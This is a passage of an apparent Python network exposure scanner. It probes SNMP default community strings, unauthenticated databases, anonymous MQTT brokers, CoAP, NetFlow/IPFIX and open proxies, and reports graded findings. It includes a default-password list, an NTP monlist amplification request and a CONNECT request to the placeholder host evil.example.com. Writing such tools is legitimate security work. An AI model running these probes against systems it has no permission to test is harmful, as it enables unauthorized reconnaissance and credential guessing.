    A valid GetResponse with error-status 0 confirms the community string
    is accepted.  Extracts sysDescr text from the first successful response.

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": port}

    # --- BER encoding helpers (stdlib-only) --------------------------------

    def _ber_len(n: int) -> bytes:
        """Encode BER definite length field."""
        if n < 0x80:
            return bytes([n])
        if n < 0x100:
            return bytes([0x81, n])
        return bytes([0x82, (n >> 8) & 0xff, n & 0xff])

    def _ber_int(v: int) -> bytes:
        """Encode non-negative integer as BER INTEGER TLV."""
        if v == 0:
            return b'\x02\x01\x00'
        raw = v.to_bytes((v.bit_length() + 7) // 8, 'big')
        if raw[0] & 0x80:          # keep sign bit clear
            raw = b'\x00' + raw
        return b'\x02' + _ber_len(len(raw)) + raw

    def _ber_tlv(data: bytes, idx: int):
        """Parse one BER TLV at *idx*; return (tag, value_bytes, next_idx)."""
        tag = data[idx];  idx += 1
        lb  = data[idx];  idx += 1
        if lb & 0x80:
            n      = lb & 0x7f
            length = int.from_bytes(data[idx:idx + n], 'big')
            idx   += n
        else:
            length = lb
        return tag, data[idx:idx + length], idx + length

    # sysDescr OID 1.3.6.1.2.1.1.1.0:
    #   first two arcs: 1*40+3=43=0x2b; remaining: 6,1,2,1,1,1,0 (each <128)
    OID_SYSDESCR = b'\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00'
    NULL         = b'\x05\x00'

    # Pre-build the invariant PDU body (request-id=1, errors=0, OID query)
    varbind_inner = OID_SYSDESCR + NULL
    varbind       = b'\x30' + _ber_len(len(varbind_inner)) + varbind_inner
    varbindlist   = b'\x30' + _ber_len(len(varbind))       + varbind
    pdu_body      = _ber_int(1) + _ber_int(0) + _ber_int(0) + varbindlist
    get_pdu       = b'\xa0' + _ber_len(len(pdu_body)) + pdu_body  # GetRequest-PDU

    communities = [
        'public', 'private', 'community', 'default', 'admin',
        'cisco', 'snmp', 'monitor', 'write',
    ]
    sysdescr_reported = False

    for community in communities:
        comm_bytes = community.encode()
        msg_inner  = (_ber_int(0)                                           # version=0 (v1)
                      + b'\x04' + _ber_len(len(comm_bytes)) + comm_bytes    # OCTET STRING
                      + get_pdu)
        pkt = b'\x30' + _ber_len(len(msg_inner)) + msg_inner

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(pkt, (host, port))
            resp, _ = sock.recvfrom(4096)
        except OSError:
            continue
        finally:
            try:
                sock.close()
            except OSError:
                pass

        # Outer validation: must be a SEQUENCE with our community string echoed
        if len(resp) < 2 or resp[0] != 0x30 or comm_bytes not in resp:
            continue

        try:
            # Unwrap outer SEQUENCE
            _, msg_val, _ = _ber_tlv(resp, 0)
            idx = 0
            tag, _, idx = _ber_tlv(msg_val, idx)   # version INTEGER
            if tag != 0x02:
                continue
            tag, _, idx = _ber_tlv(msg_val, idx)   # community OCTET STRING
            if tag != 0x04:
                continue
            tag, pdu_val, _ = _ber_tlv(msg_val, idx)  # response PDU
            if tag != 0xa2:                             # 0xa2 = GetResponse-PDU
                continue

            # Parse GetResponse-PDU: request-id, error-status, error-index
            pidx = 0
            _, _,         pidx = _ber_tlv(pdu_val, pidx)  # request-id
            _, err_bytes, pidx = _ber_tlv(pdu_val, pidx)  # error-status
            error_status = int.from_bytes(err_bytes, 'big') if err_bytes else 0
            if error_status != 0:
                continue
            _, _, pidx = _ber_tlv(pdu_val, pidx)           # error-index

        except (IndexError, struct.error, ValueError):
            continue

        findings.append(_f(
            "CRITICAL",
            f"SNMP_COMMUNITY_{community.upper()}",
            f"SNMPv1 community string '{community}' accepted",
        ))

        # Extract sysDescr from VarBindList (best-effort, first success only)
        if not sysdescr_reported:
            try:
                tag, vbl_val, _ = _ber_tlv(pdu_val, pidx)   # VarBindList SEQUENCE
                if tag == 0x30:
                    tag, vb_val, _ = _ber_tlv(vbl_val, 0)    # VarBind SEQUENCE
                    if tag == 0x30:
                        vidx = 0
                        _, _, vidx         = _ber_tlv(vb_val, vidx)   # OID (skip)
                        tag, desc_bytes, _ = _ber_tlv(vb_val, vidx)   # value
                        if tag == 0x04 and desc_bytes:
                            sysdescr = desc_bytes.decode(
                                'utf-8', errors='replace').strip()
                            if sysdescr:
                                findings.append(_f(
                                    "INFO",
                                    "SNMP_SYSDESCR",
                                    f"SNMP_SYSDESCR -- {sysdescr}",
                                ))
                                sysdescr_reported = True
            except (IndexError, struct.error, ValueError):
                pass

    return findings


# ---------------------------------------------------------------------------


def probe_database_exposure(host: str, timeout: float = 5.0) -> list:
    """Probe common database ports for accessible or unauthenticated services.

    Probes:
      - PostgreSQL 5432 -- StartupMessage (protocol 3.0, user=postgres); any
        AuthenticationXxx or ErrorResponse confirms a live server.
      - MySQL 3306      -- reads server greeting; protocol v10 byte (0x0a)
        confirms MySQL; extracts version string from null-terminated banner.
      - MongoDB 27017   -- sends OP_QUERY isMaster (BSON); OP_REPLY confirms
        query execution without authentication.
      - PgBouncer 6432  -- StartupMessage; Auth, Error, or ParameterStatus
        response confirms connection pooler accessible.

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str, port: int) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": port}

    def _tcp(port: int):
        """Return a connected TCP socket, or None on failure."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            return s
        except OSError:
            return None

    # PostgreSQL StartupMessage (protocol 3.0):
    #   length(4 BE, includes itself) + protocol_version(4 BE) + NUL-term pairs + NUL
    _params  = b'user\x00postgres\x00database\x00postgres\x00\x00'
    _startup = struct.pack('>II', 4 + 4 + len(_params), 0x00030000) + _params

    # --- PostgreSQL 5432 --------------------------------------------------
    _PG_PORT = 5432
    s = _tcp(_PG_PORT)
    if s is not None:
        try:
            s.sendall(_startup)
            resp = s.recv(128)
            # 'R' (0x52) = AuthenticationXxx; 'E' (0x45) = ErrorResponse
            if resp and resp[0] in (0x52, 0x45):
                findings.append(_f(
                    "HIGH",
                    "POSTGRESQL_PORT_OPEN",
                    "PostgreSQL accepting connections",
                    _PG_PORT,
                ))
        except OSError:
            pass
        finally:
            s.close()

    # --- MySQL 3306 -------------------------------------------------------
    _MY_PORT = 3306
    s = _tcp(_MY_PORT)
    if s is not None:
        try:
            resp = s.recv(256)
            # MySQL wire: 3-byte LE payload_length + 1-byte seq_id + payload
            # Payload byte 0 = protocol version; 0x0a = Protocol v10 (MySQL 5+)
            if len(resp) > 4 and resp[4] == 0x0a:
                null_idx = resp.find(b'\x00', 5)
                version  = (resp[5:null_idx].decode('utf-8', errors='replace')
                            if null_idx > 5 else 'unknown')
                findings.append(_f(
                    "HIGH",
                    "MYSQL_PORT_OPEN",
                    f"MySQL server version {version} responding",
                    _MY_PORT,
                ))
        except OSError:
            pass
        finally:
            s.close()

    # --- MongoDB 27017 ----------------------------------------------------
    _MG_PORT = 27017
    s = _tcp(_MG_PORT)
    if s is not None:
        try:
            # BSON document: {ismaster: 1}
            #   doc_length(4 LE) + 0x10 + "ismaster\0" + int32(4 LE) + 0x00
            #   content: 1+9+4 = 14 bytes; total with length+terminator = 19
            bson_doc   = (struct.pack('<i', 19)
                          + b'\x10ismaster\x00'
                          + struct.pack('<i', 1)
                          + b'\x00')
            # OP_QUERY (opCode=2004): flags + fullCollName (cstring) + skip + return + BSON
            query_body = (struct.pack('<I', 0)           # flags
                          + b'admin.$cmd\x00'             # fullCollectionName
                          + struct.pack('<ii', 0, -1)     # numberToSkip, numberToReturn
                          + bson_doc)
            msg_len    = 16 + len(query_body)             # 16-byte MsgHeader
            # MsgHeader: totalLength + requestID + responseTo + opCode
            wire_msg   = struct.pack('<IIII', msg_len, 1, 0, 2004) + query_body
            s.sendall(wire_msg)
            resp = s.recv(512)
            # OP_REPLY = opCode 1; opCode sits at MsgHeader bytes [12:16]
            if len(resp) >= 16:
                op_code = struct.unpack('<I', resp[12:16])[0]
                if op_code == 1:
                    findings.append(_f(
                        "CRITICAL",
                        "MONGODB_UNAUTH",
                        "MongoDB responding to queries without auth",
                        _MG_PORT,
                    ))
        except OSError:
            pass
        finally:
            s.close()

    # --- PgBouncer 6432 ---------------------------------------------------
    _PB_PORT = 6432
    s = _tcp(_PB_PORT)
    if s is not None:
        try:
            s.sendall(_startup)
            resp = s.recv(128)
            # Auth (0x52), Error (0x45), or ParameterStatus (0x53) = live pooler
            if resp and resp[0] in (0x52, 0x45, 0x53):
                findings.append(_f(
                    "HIGH",
                    "PGBOUNCER_PORT_OPEN",
                    "PgBouncer connection pooler accessible",
                    _PB_PORT,
                ))
        except OSError:
            pass
        finally:
            s.close()

    return findings


def probe_mqtt_exposure(host: str, port: int = 1883, timeout: float = 5.0) -> list:
    """Probe MQTT broker for unauthenticated access and wildcard subscription.

    Probes:
      - TCP port 1883  -- MQTT CONNECT packet (protocol level 4, clean session,
        client ID 'ablation-test'); CONNACK return code 0 = anonymous connect
        accepted; return code 5 = auth required. After anonymous connect,
        SUBSCRIBE to '#' wildcard topic.
      - TCP port 8883  -- MQTT over TLS port liveness check.

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str, p: int) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": p}

    def _tcp(p: int):
        """Return a connected TCP socket on *p*, or None on failure."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, p))
            return s
        except OSError:
            return None

    # Build MQTT CONNECT packet (MQTT 3.1.1, protocol level 4)
    # Variable header: protocol name (2-byte length + "MQTT") + level + flags + keepalive
    client_id  = b"ablation-test"
    var_header = (
        b"\x00\x04MQTT"   # protocol name with 2-byte big-endian length prefix
        + b"\x04"         # protocol level 4 (MQTT 3.1.1)
        + b"\x02"         # connect flags: CleanSession=1, no will/password/user
        + b"\x00\x3c"     # keep-alive: 60 s
    )
    # Payload: client ID prefixed with 2-byte big-endian length
    payload     = struct.pack(">H", len(client_id)) + client_id
    remaining   = var_header + payload
    connect_pkt = bytes([0x10, len(remaining)]) + remaining

    # --- MQTT TCP 1883 ----------------------------------------------------
    s = _tcp(port)
    if s is not None:
        findings.append(_f(
            "HIGH",
            "MQTT_PORT_OPEN",
            "MQTT broker accessible",
            port,
        ))
        try:
            s.sendall(connect_pkt)
            resp = s.recv(4)
            # CONNACK: 0x20 (fixed header) | 0x02 (remaining) | ack_flags | return_code
            if len(resp) >= 4 and resp[0] == 0x20 and resp[1] == 0x02:
                return_code = resp[3]
                if return_code == 0x00:
                    findings.append(_f(
                        "CRITICAL",
                        "MQTT_ANONYMOUS_CONNECT",
                        "MQTT broker accepts connections without authentication",
                        port,
                    ))
                    # SUBSCRIBE to '#' wildcard topic (packet identifier 1, QoS 0)
                    topic       = b"#"
                    sub_payload = (
                        b"\x00\x01"                        # packet identifier
                        + struct.pack(">H", len(topic))    # topic filter length
                        + topic                            # topic filter '#'
                        + b"\x00"                          # requested QoS 0
                    )
                    sub_pkt = bytes([0x82, len(sub_payload)]) + sub_payload
                    s.sendall(sub_pkt)
                    sub_resp = s.recv(5)
                    # SUBACK fixed header: 0x90
                    if sub_resp and sub_resp[0] == 0x90:
                        findings.append(_f(
                            "CRITICAL",
                            "MQTT_WILDCARD_SUBSCRIBE",
                            "MQTT wildcard topic subscription allowed (all messages accessible)",
                            port,
                        ))
                elif return_code == 0x05:
                    findings.append(_f(
                        "HIGH",
                        "MQTT_AUTH_REQUIRED",
                        "MQTT broker requires authentication (credentials needed)",
                        port,
                    ))
        except OSError:
            pass
        finally:
            s.close()

    # --- MQTT over TLS TCP 8883 -------------------------------------------
    s_tls = _tcp(8883)
    if s_tls is not None:
        findings.append(_f(
            "HIGH",
            "MQTTS_PORT_OPEN",
            "MQTT TLS port accessible",
            8883,
        ))
        s_tls.close()

    return findings


def probe_coap_exposure(host: str, port: int = 5683, timeout: float = 5.0) -> list:
    """Probe CoAP server for resource discovery and DTLS port liveness.

    Probes:
      - UDP port 5683 -- CoAP GET /.well-known/core (confirmable, message ID 1,
        token \\x01, Uri-Path options for '.well-known' and 'core'); 2.05 Content
        response confirms unauthenticated resource discovery. Any response
        confirms CoAP server responsiveness.
      - UDP port 5684 -- CoAP over DTLS port liveness (any UDP response).

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str, p: int) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": p}

    def _udp(p: int):
        """Return a configured UDP socket, or None on failure."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            return s
        except OSError:
            return None

    # Build CoAP GET request for /.well-known/core (RFC 7252)
    # Header byte 0: VER=1 (2b) | Type=CON=0 (2b) | TKL=1 (4b) -> 0x41
    # Header byte 1: Code 0.01 (GET) -> 0x01
    # Header bytes 2-3: Message ID 0x0001
    # Token: 0x01 (1 byte, matches TKL=1)
    # Options:
    #   Uri-Path (delta=11, len=11): 0xBB followed by b'.well-known'
    #   Uri-Path (delta=0,  len=4):  0x04 followed by b'core'
    coap_pkt = (
        struct.pack(">BBH", 0x41, 0x01, 0x0001)   # CoAP header
        + b"\x01"                                  # token
        + bytes([0xBB]) + b".well-known"           # Uri-Path option 1
        + bytes([0x04]) + b"core"                  # Uri-Path option 2
    )

    # --- CoAP UDP 5683 ----------------------------------------------------
    sock = _udp(port)
    if sock is not None:
        try:
            sock.sendto(coap_pkt, (host, port))
            resp, _ = sock.recvfrom(4096)
            if resp:
                # CoAP 2.05 Content: code byte (offset 1) = 0x45
                # class 2 (3b) | detail 5 (5b): (2<<5)|5 = 0x45
                if len(resp) >= 2 and resp[1] == 0x45:
                    findings.append(_f(
                        "CRITICAL",
                        "COAP_RESOURCE_DISCOVERY_UNAUTH",
                        "CoAP resource discovery successful (all IoT resources enumerable)",
                        port,
                    ))
                findings.append(_f(
                    "HIGH",
                    "COAP_RESPONSIVE",
                    "CoAP server responding on port 5683",
                    port,
                ))
        except OSError:
            pass
        finally:
            sock.close()

    # --- CoAP over DTLS UDP 5684 ------------------------------------------
    sock_tls = _udp(5684)
    if sock_tls is not None:
        try:
            sock_tls.sendto(coap_pkt, (host, 5684))
            resp_tls, _ = sock_tls.recvfrom(4096)
            if resp_tls:
                findings.append(_f(
                    "HIGH",
                    "COAPS_PORT_OPEN",
                    "CoAP over DTLS port accessible",
                    5684,
                ))
        except OSError:
            pass
        finally:
            sock_tls.close()

    return findings


def probe_netflow_ipfix_exposure(host: str, port: int = 2055, timeout: float = 5.0) -> list:
    """Probe for exposed NetFlow v5/v9 and IPFIX collectors.

    Probes:
      - UDP 2055 -- NetFlow v5 (24-byte header: version=5, count=1, uptime,
        unix_secs, unix_nsecs, sequence, engine_type, engine_id, interval);
        any response indicates an open collector (HIGH); multi-record echo
        confirms bidirectional flow telemetry exposure (CRITICAL).
      - UDP 4739 -- IPFIX/NetFlow v10 (RFC 7011 16-byte message header:
        version=0x000a, length=16, export_time, sequence=1, OD-ID=256);
        any response indicates IPFIX collector exposure (HIGH); valid IPFIX
        version in response confirms bidirectional exposure (CRITICAL).
      - UDP 9995 -- NetFlow v9 (20-byte header: version=9, count=1,
        sys_uptime=0, unix_secs, sequence=1, source_id=1); any response
        indicates NetFlow v9 collector exposure (HIGH); valid v9 echo confirms
        bidirectional flow telemetry exposure (CRITICAL).

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str, p: int) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": p}

    def _udp(p: int):
        """Return a configured UDP socket, or None on failure."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            return s
        except OSError:
            return None

    now = int(time.time())

    # -- NetFlow v5 probe (24 bytes) -- Cisco / RFC 3954 ---------------------
    # Fields: version=5, count=1, sys_uptime=0, unix_secs, unix_nsecs=0,
    #         flow_sequence=1, engine_type=0, engine_id=0, sampling_interval=0
    nf5_pkt = struct.pack(
        ">HHIIIIBBH",
        5,    # version
        1,    # count (flow records in this packet)
        0,    # sys_uptime (ms since boot)
        now,  # unix_secs
        0,    # unix_nsecs
        1,    # flow_sequence
        0,    # engine_type
        0,    # engine_id
        0,    # sampling_interval
    )  # 24 bytes

    sock = _udp(2055)
    if sock is not None:
        try:
            sock.sendto(nf5_pkt, (host, 2055))
            resp, _ = sock.recvfrom(4096)
            if resp:
                if len(resp) >= 4:
                    resp_count = struct.unpack(">H", resp[2:4])[0]
                    if resp_count > 1:
                        findings.append(_f(
                            "CRITICAL",
                            "NETFLOW_COLLECTOR_ECHOES_FLOW_DATA",
                            f"NetFlow v5 collector echoed flow records (count={resp_count}); "
                            "bidirectional flow telemetry exposure confirmed on UDP/2055",
                            2055,
                        ))
                findings.append(_f(
                    "HIGH",
                    "NETFLOW_COLLECTOR_RESPONSIVE",
                    "NetFlow v5 collector responding on UDP/2055; "
                    "unauthenticated access to network flow telemetry",
                    2055,
                ))
        except OSError:
            pass
        finally:
            sock.close()

    # -- IPFIX / NetFlow v10 probe (16 bytes) -- RFC 7011 --------------------
    # Fields: version=0x000a, length=16 (header only), export_time,
    #         sequence_number=1, observation_domain_id=256
    ipfix_pkt = struct.pack(
        ">HHIII",
        0x000a,  # version (IPFIX = 10)
        16,      # message length (header only, no sets)
        now,     # export time (unix epoch)
        1,       # sequence number
        256,     # observation domain ID
    )  # 16 bytes

    sock_ipfix = _udp(4739)
    if sock_ipfix is not None:
        try:
            sock_ipfix.sendto(ipfix_pkt, (host, 4739))
            resp_ipfix, _ = sock_ipfix.recvfrom(4096)
            if resp_ipfix:
                if len(resp_ipfix) >= 2 and struct.unpack(">H", resp_ipfix[0:2])[0] == 0x000a:
                    findings.append(_f(
                        "CRITICAL",
                        "IPFIX_COLLECTOR_ECHOES_FLOW_DATA",
                        "IPFIX collector returned a valid IPFIX message (version=0x000a); "
                        "bidirectional flow telemetry exposure confirmed on UDP/4739",
                        4739,
                    ))
                findings.append(_f(
                    "HIGH",
                    "IPFIX_COLLECTOR_RESPONSIVE",
                    "IPFIX/NetFlow v10 collector responding on UDP/4739; "
                    "unauthenticated access to exported flow metadata",
                    4739,
                ))
        except OSError:
            pass
        finally:
            sock_ipfix.close()

    # -- NetFlow v9 probe (20 bytes) -- RFC 3954 -----------------------------
    # Fields: version=9, count=1, sys_uptime=0, unix_secs, sequence=1,
    #         source_id=1
    nf9_pkt = struct.pack(
        ">HHIIII",
        9,    # version
        1,    # count
        0,    # sys_uptime (ms)
        now,  # unix_secs
        1,    # sequence_number
        1,    # source_id
    )  # 20 bytes

    sock_v9 = _udp(9995)
    if sock_v9 is not None:
        try:
            sock_v9.sendto(nf9_pkt, (host, 9995))
            resp_v9, _ = sock_v9.recvfrom(4096)
            if resp_v9:
                if len(resp_v9) >= 2 and struct.unpack(">H", resp_v9[0:2])[0] == 9:
                    findings.append(_f(
                        "CRITICAL",
                        "NETFLOW_V9_ECHOES_FLOW_DATA",
                        "NetFlow v9 collector returned a valid v9 response; "
                        "bidirectional flow telemetry exposure confirmed on UDP/9995",
                        9995,
                    ))
                findings.append(_f(
                    "HIGH",
                    "NETFLOW_V9_RESPONSIVE",
                    "NetFlow v9 collector responding on UDP/9995; "
                    "unauthenticated access to network flow records",
                    9995,
                ))
        except OSError:
            pass
        finally:
            sock_v9.close()

    return findings


def probe_network_time_protocol(host: str, port: int = 123, timeout: float = 5.0) -> list:
    """Probe NTP server for amplification and monlist exposure.

    Probes:
      - UDP 123 -- NTP mode 3 (client) request: 48-byte packet with
        li_vn_mode=0x1b (LI=0, VN=3, Mode=3); response with mode bits==4
        (server) confirms NTP server is accessible to untrusted clients (HIGH).
      - UDP 123 -- NTP mode 7 monlist request (REQ_MON_GETLIST_1, opcode 42):
        8-byte mode-7 header (R=0, M=0, VN=2, Mode=7, Impl=IMPL_XNTPD=0x03,
        Req=0x2a); response > 200 bytes indicates monlist client list return,
        confirming DRDoS amplification vector (CRITICAL).

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str, p: int) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": p}

    def _udp(p: int):
        """Return a configured UDP socket, or None on failure."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            return s
        except OSError:
            return None

    # -- NTP mode 3 client request (RFC 5905, 48 bytes) ----------------------
    # Byte 0: LI=00 (no leap warn), VN=011 (v3), Mode=011 (client) -> 0x1b
    # Bytes 1-47: zeros (all other fields empty)
    ntp_client_req = struct.pack("!B", 0x1b) + b"\x00" * 47

    sock = _udp(port)
    if sock is not None:
        try:
            sock.sendto(ntp_client_req, (host, port))
            resp, _ = sock.recvfrom(1024)
            if resp and len(resp) >= 1:
                resp_mode = resp[0] & 0x07
                if resp_mode == 4:
                    findings.append(_f(
                        "HIGH",
                        "NTP_SERVER_RESPONSIVE",
                        "NTP server replies to unauthenticated mode-3 client requests on UDP/123; "
                        "potential amplification source and timing oracle",
                        port,
                    ))
                else:
                    findings.append(_f(
                        "MEDIUM",
                        "NTP_PORT_RESPONSIVE",
                        f"NTP port responded (mode={resp_mode}); "
                        "server accessible to untrusted clients",
                        port,
                    ))
        except OSError:
            pass
        finally:
            sock.close()

    # -- NTP monlist / mode-7 probe (REQ_MON_GETLIST_1, opcode 42) -----------
    # Byte 0: R=0|M=0|VN=2|Mode=7 -> 0b00_010_111 = 0x17
    # Byte 1: A=0 (no auth) | Sequence=0               -> 0x00
    # Byte 2: Implementation = 0x03 (IMPL_XNTPD)
    # Byte 3: Request code = 42 = 0x2a (REQ_MON_GETLIST_1)
    # Bytes 4-5: Err=0, NumItems=0 (big-endian uint16)
    # Bytes 6-7: MBZ=0, ItemSize=0 (big-endian uint16)
    monlist_req = struct.pack("!BBBBHH", 0x17, 0x00, 0x03, 0x2a, 0, 0)

    sock_ml = _udp(port)
    if sock_ml is not None:
        try:
            sock_ml.sendto(monlist_req, (host, port))
            resp_ml, _ = sock_ml.recvfrom(16384)
            if resp_ml and len(resp_ml) > 200:
                findings.append(_f(
                    "CRITICAL",
                    "NTP_MONLIST_AMPLIFICATION",
                    f"NTP monlist (REQ_MON_GETLIST_1) returned {len(resp_ml)} bytes; "
                    "unauthenticated client list disclosure and DRDoS amplification confirmed",
                    port,
                ))
            elif resp_ml:
                findings.append(_f(
                    "MEDIUM",
                    "NTP_MONLIST_PARTIAL_RESPONSE",
                    f"NTP monlist query returned {len(resp_ml)} bytes (<200); "
                    "limited exposure or restricted configuration",
                    port,
                ))
        except OSError:
            pass
        finally:
            sock_ml.close()

    return findings


# ---------------------------------------------------------------------------
# Proxy / MITM infrastructure detection
# ---------------------------------------------------------------------------

def probe_tcp_proxy_exposure(host: str, port: int = 8080, timeout: float = 5.0) -> list:
    """Detect exposed TCP proxies and MITM infrastructure.

    Probes (per Black Hat Go ch02 TCP/proxy chaining coverage):
      - HTTP CONNECT on common proxy ports (8080, 3128, 8888, 8118, 1080):
        200 -> CRITICAL HTTP_CONNECT_PROXY_OPEN (anonymous open proxy);
        407 -> HIGH HTTP_PROXY_AUTH_REQUIRED (authenticated proxy exposed);
        Via / Proxy-Agent / X-Cache headers without 200/407 ->
        MEDIUM HTTP_PROXY_DETECTED.
      - SOCKS5 greeting on port 1080: 3-byte VER+NMETHODS+NO_AUTH (RFC 1928);
        response 0x05 0x00 -> CRITICAL SOCKS5_PROXY_NO_AUTH;
        response 0x05 0xFF -> MEDIUM SOCKS5_PROXY_AUTH_ONLY.
      - SOCKS4 CONNECT request on port 1080: 9-byte header targeting
        1.2.3.4:80 with null user; response byte 1 == 0x5a ->
        CRITICAL SOCKS4_PROXY_OPEN.
      - Server header containing "squid" in any HTTP response ->
        HIGH SQUID_PROXY_EXPOSED with version.

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []
    _seen: set = set()

    def _f(severity: str, title: str, detail: str, p: int) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": p}

    def _tcp(p: int):
        """Return a connected TCP socket, or None on failure."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, p))
            return s
        except (OSError, socket.timeout):
            try:
                s.close()
            except Exception:
                pass
            return None

    _proxy_ports = [8080, 3128, 8888, 8118, 1080]

    # RFC 7231 s4.3.6: CONNECT method requests a tunnel to an arbitrary host.
    # An open (unauthenticated) proxy returns 200; auth-required returns 407.
    _connect_req = (
        b"CONNECT evil.example.com:443 HTTP/1.0\r\n"
        b"Host: evil.example.com:443\r\n"
        b"\r\n"
    )

    for _p in _proxy_ports:
        sock = _tcp(_p)
        if sock is None:
            continue
        try:
            sock.sendall(_connect_req)
            raw = b""
            try:
                while len(raw) < 4096:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    raw += chunk
                    if b"\r\n\r\n" in raw:
                        break
            except (OSError, socket.timeout):
                pass

            if not raw:
                continue

            hdr_block = raw.split(b"\r\n\r\n", 1)[0].decode("latin-1", errors="replace")
            first_line = hdr_block.split("\r\n", 1)[0].upper()
            lower_hdrs = hdr_block.lower()

            status_code = 0
            _sm = re.search(r"HTTP/[\d.]+ (\d{3})", first_line)
            if _sm:
                status_code = int(_sm.group(1))

            # Squid fingerprint via Server header
            _srv = re.search(r"(?i)server:\s*(.+)", hdr_block)
            if _srv and "squid" in _srv.group(1).lower():
                _vm = re.search(r"squid/([\d.]+)", _srv.group(1), re.IGNORECASE)
                _ver = _vm.group(1) if _vm else "unknown"
                _key = f"SQUID:{_p}"
                if _key not in _seen:
                    _seen.add(_key)
                    findings.append(_f(
                        "HIGH",
                        "SQUID_PROXY_EXPOSED",
                        f"Squid proxy v{_ver} identified via Server header on port {_p}; "
                        "version disclosure aids targeted CVE matching and cache poisoning",
                        _p,
                    ))

            if status_code == 200:
                _key = f"CONNECT_OPEN:{_p}"
                if _key not in _seen:
                    _seen.add(_key)
                    findings.append(_f(
                        "CRITICAL",
                        "HTTP_CONNECT_PROXY_OPEN",
                        f"Unauthenticated HTTP CONNECT proxy on port {_p} tunnels to "
                        "arbitrary external hosts; enables IP laundering, traffic relay, "
                        "and use as MITM pivot without credentials",
                        _p,
                    ))
            elif status_code == 407:
                _key = f"PROXY_AUTH:{_p}"
                if _key not in _seen:
                    _seen.add(_key)
                    findings.append(_f(
                        "HIGH",
                        "HTTP_PROXY_AUTH_REQUIRED",
                        f"Authenticated HTTP proxy on port {_p} returned 407 Proxy "
                        "Authentication Required; proxy infrastructure exposed; "
                        "credential brute-force and bypass surface present",
                        _p,
                    ))

            # Proxy-indicative headers without a definitive status code
            _has_proxy_hdr = (
                "via:" in lower_hdrs
                or "proxy-agent:" in lower_hdrs
                or "x-cache:" in lower_hdrs
                or "x-squid" in lower_hdrs
            )
            if _has_proxy_hdr and status_code not in (200, 407):
                _key = f"PROXY_HDR:{_p}"
                if _key not in _seen:
                    _seen.add(_key)
                    findings.append(_f(
                        "MEDIUM",
                        "HTTP_PROXY_DETECTED",
                        f"Proxy-indicative headers (Via / Proxy-Agent / X-Cache) present "
                        f"in HTTP response on port {_p}; proxy infrastructure confirmed",
                        _p,
                    ))
        except (OSError, socket.timeout):
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

    # -- SOCKS5 no-auth probe on port 1080 -------------------------------------
    # RFC 1928: client sends VER(1)=0x05 + NMETHODS(1) + METHODS[nmethods].
    # Method 0x00 = NO_AUTH. Server selects: VER(1) + METHOD(1).
    # Response 0x05 0x00 = SOCKS5 + NO_AUTH selected -> open unauthenticated proxy.
    _socks5_greeting = struct.pack("!BBB", 0x05, 0x01, 0x00)
    sock5 = _tcp(1080)
    if sock5 is not None:
        try:
            sock5.sendall(_socks5_greeting)
            resp5 = b""
            try:
                resp5 = sock5.recv(2)
            except (OSError, socket.timeout):
                pass
            if len(resp5) >= 2 and resp5[0] == 0x05:
                if resp5[1] == 0x00:
                    findings.append(_f(
                        "CRITICAL",
                        "SOCKS5_PROXY_NO_AUTH",
                        "SOCKS5 proxy on port 1080 accepted NO_AUTH method (RFC 1928 "
                        "method 0x00); full TCP tunnel to any host:port without credentials",
                        1080,
                    ))
                elif resp5[1] == 0xFF:
                    # 0xFF = no acceptable methods; still a SOCKS5 listener
                    findings.append(_f(
                        "MEDIUM",
                        "SOCKS5_PROXY_AUTH_ONLY",
                        "SOCKS5 proxy on port 1080 rejected NO_AUTH (requires "
                        "authentication); SOCKS5 proxy infrastructure confirmed and exposed",
                        1080,
                    ))
        except (OSError, socket.timeout):
            pass
        finally:
            try:
                sock5.close()
            except Exception:
                pass

    # -- SOCKS4 connect probe on port 1080 -------------------------------------
    # Leech 1996 SOCKS4: VN=4, CD=1 (CONNECT), DSTPORT(2BE), DSTIP(4), USER\0.
    # Target 1.2.3.4:80, null user string.
    # Response: VN=0, CD=0x5a (90=granted) -> open SOCKS4 proxy.
    _socks4_req = struct.pack(
        "!BBH4sB",
        0x04,                         # VN (SOCKS version 4)
        0x01,                         # CD (CONNECT command)
        80,                           # DSTPORT (big-endian)
        socket.inet_aton("1.2.3.4"),  # DSTIP (4 bytes)
        0x00,                         # null user string terminator
    )
    sock4 = _tcp(1080)
    if sock4 is not None:
        try:
            sock4.sendall(_socks4_req)
            resp4 = b""
            try:
                resp4 = sock4.recv(8)
            except (OSError, socket.timeout):
                pass
            if len(resp4) >= 2 and resp4[0] == 0x00 and resp4[1] == 0x5a:
